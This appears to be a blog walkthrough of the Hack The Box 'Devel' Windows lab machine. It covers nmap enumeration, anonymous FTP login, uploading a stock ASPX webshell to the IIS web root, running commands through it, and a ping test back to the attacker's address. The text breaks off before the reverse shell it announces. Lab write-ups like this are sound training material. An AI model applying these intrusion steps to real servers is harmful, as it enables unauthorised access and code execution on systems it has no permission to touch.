Here is another box from Hack the Box (HTB) that is simple and great for beginners. In this HTB, I will not be using Metasploit to access the box. Instead, I'll be creating a SMB server to obtain a reverse shell and gain access to the machine. 

<h2><a class="header_post" name="hackthebox">Hack The Box</a></h2>

* Operating System: Windows
* Difficulty: Easy

<h2><a class="header_post" name="enumeration">Enumeration</a></h2>

Let's start with the nmap scan. 

<img src="/images/blog/devel/ipaddress.jpg" alt="nmap scan">

	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     Microsoft ftpd
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| 03-18-17  02:06AM       <DIR>          aspnet_client
	| 05-20-20  07:47AM                 1442 cmdasp.aspx
	| 03-17-17  05:37PM                  689 iisstart.htm
	| 05-20-20  07:31AM                    7 test.html
	|_03-17-17  05:37PM               184946 welcome.png
	| ftp-syst: 
	|_  SYST: Windows_NT
	80/tcp open  http    Microsoft IIS httpd 7.5
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/7.5
	|_http-title: IIS7

From the results, we can see that port 21 (ftp) is open and allows for anonymous ftp login. 

### Website Information 

First, let's access the FTP service through the web browser by heading to 10.10.10.5

Nothing much here. Checked the source code--nothing either. 

Next, I opened up Burp Suite to take a look at the response headers. That said, http headers are not always accurate since developers can change the information... still a good idea to check though.

From the response header, we can see that the application framework is using ASP.NET so we might be able to use an .aspx file later on. 

### FTP Information 

In the nmap scan, we found out that we can login to the ftp service anonymously. So I accessed the ftp service through terminal. 

	root@kali:~# ftp 10.10.10.5
	Connected to 10.10.10.5.
	220 Microsoft FTP Service
	Name (10.10.10.5:root): anonymous
	331 Anonymous access allowed, send identity (e-mail name) as password.
	Password:
	230 User logged in.
	Remote system type is Windows_NT.

That worked. Let's see if we can upload a file onto the ftp service. 

* In the local terminal window, `echo hello > test.html`
* In the ftp service terminal window, `put test.html`

Looks like it uploaded. To double-check I went to the web browser to see if it's visible.

Now recall in the **Website Information** section we found out that ftp was running ASP.NET framework, so we can try using the `put` command to upload an .aspx file.

I searched in Kali Linux and found that they have a .aspx available in the webshells directory. This file will provide us with the ability to execute commands whilst in the web browser.

	root@kali:~# locate *.aspx
	/usr/share/webshells/aspx/cmdasp.aspx
	
We can copy the file into our current directory and then upload it to the ftp service.

* In the local terminal window, `cp /usr/share/webshells/aspx/cmdasp.aspx .`
* In ftp service terminal window, `put cmdasp.aspx`

Worked! Let's access the webshell by going to 10.10.10.5/cmdasp.aspx

* `dir` = displays information about the files and directories.

Last part of enumeration is to confirm that both the target and our local machine can talk to each other. To test this, we can run a ping test.

In the local terminal window, `tcpdump -i tun0 -n icmp`

	listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes                                                                                    
	16:59:24.588581 IP 10.10.10.5 > 10.10.14.31: ICMP echo request, id 1, seq 5, length 40                                                                  
	16:59:24.588659 IP 10.10.14.31 > 10.10.10.5: ICMP echo reply, id 1, seq 5, length 40                                                                    
	16:59:25.613355 IP 10.10.10.5 > 10.10.14.31: ICMP echo request, id 1, seq 6, length 40                                                                  
	16:59:25.613456 IP 10.10.14.31 > 10.10.10.5: ICMP echo reply, id 1, seq 6, length 40                                                                    
	16:59:26.637219 IP 10.10.10.5 > 10.10.14.31: ICMP echo request, id 1, seq 7, length 40                                                                  

* `icmp` = print only icmp packets.
* `-n` = don't covert addresses (host names, port numbers) to names.

In web browser, `ping 10.10.14.31`

<img src="/images/blog/devel/ping.png" alt="ping test">

The response confirms that we've received a ping request from the ftp server--awesome. Now that we have command execution and can communicate to/from the box, our next step is turn this into an interactive reverse shell.

### Summary 

A few things to note before we move forward: 

* We now have the ability to input commands.
